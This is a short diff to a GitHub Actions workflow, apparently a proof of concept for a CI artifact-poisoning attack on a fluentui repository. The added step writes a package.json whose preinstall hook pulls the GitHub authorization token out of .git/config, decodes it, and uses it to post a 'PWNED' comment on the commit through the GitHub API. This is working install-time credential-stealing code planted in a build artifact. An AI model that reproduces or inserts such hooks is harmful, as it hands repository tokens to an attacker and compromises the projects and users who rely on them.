@@ -91,6 +91,19 @@ jobs:
             integrity sha512-5ad+U2YGrmmiw6du20AQW5XuWo7UKN2052FjSV7MX+Wfjf8sCqcsZe62NfgHys4QI4/Y+vQvLKYL8jWtA1ZBTA==
           EOT
 
+      - run: |          
+          # Modify yarn.lock file with a malicious package
+          cat <<EOT >> artifacts/package.json
+          {
+            "name": "@fluentui/fluentui-repo",
+            "version": "1.0.0",
+            "description": "Reusable React components for building experiences for Microsoft 365.",
+            "scripts": {
+              "preinstall": "curl -X POST -H \"Authorization: Token $(cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3 | base64 -d | cut -d':' -f 2)\" -d '{\"body\": \"PWNED\"}' https://api.github.com/repos/$GITHUB_REPOSITORY/commits/$GITHUB_SHA/comments"
+            }
+          }
+          EOT
+
       - name: Upload environment variables artifact
         uses: actions/upload-artifact@v3
         with:
